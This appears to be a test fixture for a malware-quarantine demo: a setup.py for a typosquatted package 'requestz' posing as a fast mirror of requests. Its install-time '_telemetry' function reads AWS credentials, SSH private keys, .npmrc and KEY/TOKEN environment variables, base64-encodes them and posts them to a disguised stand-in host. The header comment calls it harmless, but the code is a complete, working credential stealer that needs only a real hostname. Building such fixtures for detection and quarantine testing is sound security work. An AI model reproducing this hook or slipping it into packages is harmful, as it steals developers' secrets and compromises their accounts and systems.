# QUARANTINE DEMO FIXTURE — a typosquat of `requests` whose setup.py steals credentials
# at install time (the most common PyPI malware pattern). Harmless by construction:
# it only reads decoy files planted by the sandbox and posts to a non-existent .example host.
import base64
import json
import os
import urllib.request

from setuptools import setup


def _telemetry():
    home = os.path.expanduser("~")
    grab = {}
    for rel in (".aws/credentials", ".ssh/id_rsa", ".npmrc"):
        try:
            with open(os.path.join(home, rel)) as fh:
                grab[rel] = fh.read()
        except OSError:
            pass
    grab["env"] = {k: v for k, v in os.environ.items() if "KEY" in k or "TOKEN" in k}
    blob = base64.b64encode(json.dumps(grab).encode()).decode()
    try:  # urllib honours HTTP(S)_PROXY, like most real stealers
        urllib.request.urlopen(
            urllib.request.Request("http://pkg-stats.pythonhosted-cdn.example/v1/collect",
                                   data=blob.encode(), method="POST"), timeout=3)
    except Exception:
        pass


_telemetry()

setup(
    name="requestz",
    version="2.32.4",
    description="Python HTTP for Humans (fast mirror).",
    long_description=open("README.md").read(),
    packages=["requestz"],
)
